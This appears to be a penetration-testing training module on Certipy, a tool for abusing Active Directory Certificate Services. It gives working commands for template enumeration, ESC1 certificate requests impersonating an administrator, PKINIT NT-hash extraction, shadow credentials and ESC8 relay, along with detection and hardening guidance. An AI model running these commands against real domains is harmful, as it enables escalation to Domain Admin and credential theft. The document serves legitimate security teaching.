> **English** | [Italiano](README.md)

# Certipy - Active Directory certificate services abuse

> - **Phase:** Privilege Escalation / Credential Access in the domain - AD CS abuse (PKINIT, vulnerable templates, relay)
> - **Visibility:** Medium - certificate requests to the CA (Event ID 4886/4887) and PKINIT authentications (4768 with a certificate) are traceable
> - **Prerequisites:** low-privilege domain credentials; a reachable AD CS CA with at least one misconfiguration (ESC1-ESC16 templates, ESC8 web endpoint)
> - **Technique:** `Certipy (AD CS abuse)` | **Typical severity:** `Critical` | **Finding ID:** to assign in lab

- Objective: consolidated operational reference for Certipy to enumerate and exploit AD CS misconfigurations, obtaining certificates that allow authentication as privileged users (up to Domain Admin) and extraction of the NT hash.

---

## Executive summary

Certipy is the reference tool for abusing Active Directory Certificate Services from Linux. AD CS, if
misconfigured, turns a CA into a direct path toward Domain Admin: an authentication certificate issued on behalf
of a privileged user is equivalent to their credentials (PKINIT, then TGT and NT hash). Certipy covers the whole
flow: enumeration of misconfigurations (ESC1-ESC16), certificate request/forgery, PKINIT authentication, shadow
credentials and relay (ESC8). It is one of the most reliable escalation paths in modern AD, often `Critical`.

## Execution / commands

### Phase 1 - misconfiguration enumeration

```bash
# enumerate CAs and templates, highlighting the vulnerable ones (ESC1..ESC16)
certipy find -u lowpriv@lab.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable -stdout
# also produces a report; look for 'ESCx' and the enrollment permissions
```

### Phase 2 - ESC1 (template that allows an arbitrary SAN)

```bash
# request a certificate for the vulnerable template specifying a privileged UPN (SAN)
certipy req -u lowpriv@lab.local -p 'Password1' -dc-ip 10.10.10.10 \
  -ca 'LAB-CA' -template 'VulnTemplate' -upn 'administrator@lab.local'
# -> administrator.pfx

# PKINIT authentication with the certificate -> TGT + administrator's NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
# [*] Got hash for 'administrator@lab.local': aad3b...:<NThash>   <-- DA credentials
```

### Shadow credentials (GenericWrite over the target) and ESC8 (relay)

```bash
# shadow credentials: adds a KeyCredentialLink, authenticates via PKINIT and returns the NT hash
certipy shadow auto -u lowpriv@lab.local -p 'Password1' -account 'svc_sql' -dc-ip 10.10.10.10

# ESC8: relay the (coerced) NTLM authentication toward the CA web endpoint to issue a cert
certipy relay -target 'http://ca01.lab.local/certsrv/certfnsh.asp' -template 'DomainController'
# combine with coercion (PetitPotam/Coercer) toward the attacker
```

Illustrative output (representative):

```
certipy find ... -vulnerable
[!] Vulnerabilities: ESC1 - 'Domain Users' can enroll and supply arbitrary SAN   <-- exploitable template
```

## Analysis of results

A template with open enrollment and an arbitrary SAN (ESC1) allows issuing a certificate for the administrator
and authenticating as them: direct escalation to Domain Admin (`Critical`). The shadow credential extends the
abuse to any object over which you have GenericWrite; ESC8 exploits the web endpoint + coercion to obtain a
Domain Controller certificate. The certificate is a persistent credential: it remains valid even after a
password change, until it expires/is revoked.

### Theoretical analysis

AD CS introduces a second root of trust (certificates) alongside passwords: a template misconfiguration breaks
the assumption that only who knows the secret can authenticate as a principal. The defense is in the PKI model:
remove the arbitrary-SAN flag (`ENROLLEE_SUPPLIES_SUBJECT`), restrict enrollment permissions, enable manager
approval and disable NTLM authentication toward the CA web endpoints (Extended Protection).

## Remediation (blue team)

**Detection.** Certificate requests (Event ID 4886/4887) with a SAN that does not match the requester; PKINIT
authentications (4768 with a certificate) for privileged accounts; changes to `msDS-KeyCredentialLink` (5136);
coercion followed by requests to the CA.

**Hardening.** Remove `ENROLLEE_SUPPLIES_SUBJECT` from templates; restrict enrollment permissions and enable
approval; Extended Protection for Authentication (EPA) and HTTPS-only on the CA web endpoints; monitor and,
where needed, enforce strong SAN mapping (`StrongCertificateBindingEnforcement`).

---

## Real-world scenario: post-exploitation projection

> Applies to the "cert for a privileged user up to Domain Admin" outcome (severity Critical).

**Red team:** from `Domain Users`, `certipy find` identifies an ESC1 template; `certipy req` issues a cert for
the administrator; `certipy auth` returns a TGT and NT hash. The certificate stays valid as a backdoor even
after a password reset (persistence). ESC8 allows domain compromise starting from a simple coercion.

**Blue team:** correlate 4886/4887 with an anomalous SAN and the low-privilege origin; contain by revoking the
issued certificates and rotating KRBTGT if the TGT was forged; eradicate by fixing the templates. Lesson: the
internal PKI is an escalation vector just as much as ACLs, and must be audited with the same rigor.

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `Certipy` | ad cs abuse | cli - active | end-to-end enumeration and exploitation of ad cs (esc1-esc16, pkinit, relay) |
| `Certify` / `Certutil` | ad cs (windows) | cli - active | windows-side equivalent (c#) for enum and certificate request |
| `PetitPotam` / `Coercer` | coercion | cli - active | forces dc authentication toward the relay (esc8) |
| `impacket` (ntlmrelayx) | relay | cli - active | ntlm relay toward the ca web endpoint |

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| credential access | steal or forge authentication certificates | `T1649` | issuance/forgery of ad cs certificates to authenticate as privileged users. |
| persistence/privesc | account manipulation | `T1098` | shadow credentials: addition of a keycredentiallink for pkinit. |

---

## Links to other modules

| source | this technique | effect |
| :--- | :--- | :--- |
| [esc-enumeration](<../esc-enumeration/README.en.md>) | certipy (`find`) | identifies the vulnerable templates and endpoints |
| certipy (`req`/`auth`) | [esc1-template-abuse](<../esc1-template-abuse/README.en.md>) | exploits the arbitrary san to impersonate a privileged user |
| certipy (`relay`) | [esc8-relay-adcs](<../esc8-relay-adcs/README.en.md>) | relays the authentication toward the ca web endpoint |
| certipy (`shadow`) | [shadow-credentials](<../../05-credential-dumping/shadow-credentials/README.en.md>) | uses the keycredentiallink to obtain the nt hash via pkinit |

---

> **Note:** Educational content. The commands are functional and must be executed only in owned labs or with explicit authorization. Illustrative outputs, not from real systems.
